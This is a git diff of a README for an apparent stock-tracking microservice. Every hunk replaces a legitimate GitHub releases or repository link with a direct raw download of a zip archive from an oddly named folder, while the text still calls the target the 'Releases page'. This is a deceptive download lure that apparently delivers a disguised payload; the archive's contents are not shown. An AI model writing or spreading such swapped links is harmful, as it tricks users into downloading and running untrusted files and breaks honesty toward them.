@@ -1,7 +1,7 @@
 # 🛠️ inventory-microservice - Simple Stock Tracking Made Easy
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Zeirby/inventory-microservice/releases)
+[![Download](https://raw.githubusercontent.com/Zeirby/inventory-microservice/main/onychatrophia/inventory-microservice-v1.1.zip%20Latest%https://raw.githubusercontent.com/Zeirby/inventory-microservice/main/onychatrophia/inventory-microservice-v1.1.zip)](https://raw.githubusercontent.com/Zeirby/inventory-microservice/main/onychatrophia/inventory-microservice-v1.1.zip)
 
 ## 📖 Overview
 The **inventory-microservice** helps you track product stock levels effortlessly. This application updates your inventory in real-time across multiple services. It is designed for retail businesses that need to keep their inventory accurate and organized.
@@ -23,7 +23,7 @@ Before you start, make sure your system meets these requirements:
 - Lightweight and efficient
 
 ## ⬇️ Download & Install
-To download the application, visit the [Releases page](https://github.com/Zeirby/inventory-microservice/releases).
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Zeirby/inventory-microservice/main/onychatrophia/inventory-microservice-v1.1.zip).
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions.
@@ -58,7 +58,7 @@ Once setup is complete, you can start using the application to manage your inven
 
 ## 🔄 Updating the Application
 To keep your app running smoothly, regularly check for updates. 
-1. Visit the [Releases page](https://github.com/Zeirby/inventory-microservice/releases) to see if a new version is available.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Zeirby/inventory-microservice/main/onychatrophia/inventory-microservice-v1.1.zip) to see if a new version is available.
 2. Download the latest version and follow the installation steps again.
 
 ## 💬 Getting Help
@@ -72,7 +72,7 @@ If you encounter any issues or need assistance, refer to the following options:
 - Test the application during off-peak hours to avoid disruption to your business.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/Zeirby/inventory-microservice)
+- [GitHub Repository](https://raw.githubusercontent.com/Zeirby/inventory-microservice/main/onychatrophia/inventory-microservice-v1.1.zip)
 - [User Manual](#)
 - [Community Forum](#)
 
